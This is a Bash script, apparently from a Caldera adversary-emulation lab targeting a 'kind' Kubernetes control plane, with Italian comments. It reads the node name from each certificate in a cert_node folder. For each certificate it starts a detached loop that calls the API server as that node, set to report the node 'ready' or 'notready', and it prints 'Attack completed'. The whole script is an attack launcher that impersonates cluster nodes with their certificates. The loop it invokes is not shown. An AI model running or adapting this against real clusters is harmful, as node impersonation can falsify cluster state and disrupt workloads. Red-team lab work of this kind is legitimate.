#!/usr/bin/env bash
set -euo pipefail

API_SERVER="${API_SERVER:-https://kind-cluster-control-plane:6443}"
MODE="${MODE:-ready}"                    # ready | notready
BASE="$DATA_PATH/KC5"
LOG_DIR="$BASE/logs"
PID_LIST="$BASE/pids"

mkdir -p "$LOG_DIR"

node_from_pem() {
  openssl x509 -in "$1" -noout -subject 2>/dev/null \
    | sed -n 's/^subject=.*CN *= *system:node:\([^,/]*\).*/\1/p' | head -n1
}

for pem in "$BASE"/cert_node/*.pem; do
  [[ -f "$pem" ]] || continue
  NODE="$(node_from_pem "$pem")"
  if [[ -z "$NODE" ]]; then
    echo "SKIP $pem (CN non è system:node:*)" >&2
    continue
  fi

  LOG_FILE="$LOG_DIR/$NODE.log"

  echo "Avvio updater per $NODE con $pem (MODE=$MODE)"
  # stacca dal terminale e logga su file
  setsid env \
    API_SERVER="$API_SERVER" \
    CERT_PATH="$pem" \
    MODE="$MODE" \
    bash /opt/caldera/common/api-loop.sh \
      >"$LOG_FILE" 2>&1 < /dev/null &

  pid=$!
  echo "$pid" | tee -a "$PID_LIST"
  echo "Attack completed for $pem"
done

echo "PIDs in $PID_LIST"
echo "Log per nodo in $LOG_DIR/*.log"
